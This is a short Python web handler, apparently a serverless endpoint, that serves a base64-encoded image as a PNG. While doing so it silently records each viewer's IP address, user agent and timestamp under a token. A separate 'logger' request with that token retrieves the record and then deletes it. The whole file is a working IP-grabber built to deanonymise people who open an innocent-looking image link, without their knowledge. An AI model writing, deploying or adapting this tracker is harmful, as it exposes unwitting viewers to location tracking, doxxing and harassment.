# api/image.py
import json
import base64
import time
from http.server import BaseHTTPRequestHandler
import urllib.parse

# Store IPs here
ip_store = {}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        token = params.get('token', [None])[0]
        img_b64 = params.get('img', [None])[0]
        
        # Get the viewer's IP
        ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        if not ip:
            ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'unknown')
        
        # === If this is the logger asking for the IP ===
        if token and not img_b64:
            stored = ip_store.get(token)
            if stored:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(stored).encode())
                del ip_store[token]
                return
            else:
                self.send_response(404)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"error": "No IP yet"}).encode())
                return
        
        # === If this is someone opening the image ===
        if img_b64:
            if not token:
                token = f"img_{int(time.time())}_{hash(ip) % 10000}"
            
            ip_store[token] = {
                "ip": ip,
                "user_agent": user_agent,
                "timestamp": time.time()
            }
            
            print(f"LOGGED: {ip} -> {token}")
            
            try:
                img_bytes = base64.b64decode(img_b64)
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                self.end_headers()
                self.wfile.write(img_bytes)
                return
            except:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'Bad image data')
                return
        
        # === No params ===
        self.send_response(400)
        self.end_headers()
        self.wfile.write(b'Missing ?img= or ?token=')
